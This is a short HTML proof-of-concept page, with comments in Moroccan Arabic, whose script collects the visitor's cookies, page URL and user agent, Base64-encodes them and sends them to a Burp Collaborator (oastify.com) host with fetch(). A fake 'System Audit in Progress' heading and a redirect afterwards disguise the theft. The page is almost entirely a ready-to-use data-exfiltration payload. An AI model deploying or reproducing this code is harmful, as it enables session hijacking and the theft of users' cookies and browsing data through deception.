<!DOCTYPE html>
<html>
<head>
    <title>Security Analysis PoC</title>
</head>
<body>
    <h1>System Audit in Progress...</h1>
    <script>
        // حط هنا رابط الـ Burp Collaborator ديالك
        var collaborator_url = "z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com";
        
        // جمع الداتا الحساسة (الـ DOM والـ Cookies المتاحة)
        var leaked_info = {
            location: window.location.href,
            cookies: document.cookie,
            ua: navigator.userAgent,
            timestamp: new Date().getTime()
        };

        // تشفير الداتا بـ Base64
        var payload = btoa(unescape(encodeURIComponent(JSON.stringify(leaked_info))));
        
        // إرسال الداتا لـ Burp Collaborator عبر طلب Fetch
        // هاد الطريقة غاتخلي Burp يسجل الـ Request والـ IP والـ Headers
        fetch(collaborator_url + "/?exfil=" + payload, {
            mode: 'no-cors'
        }).then(() => {
            // تحويل الصفحة باش تبان العملية طبيعية
            window.location.href = collaborator_url + "/success";
        });
    </script>
</body>
</html>
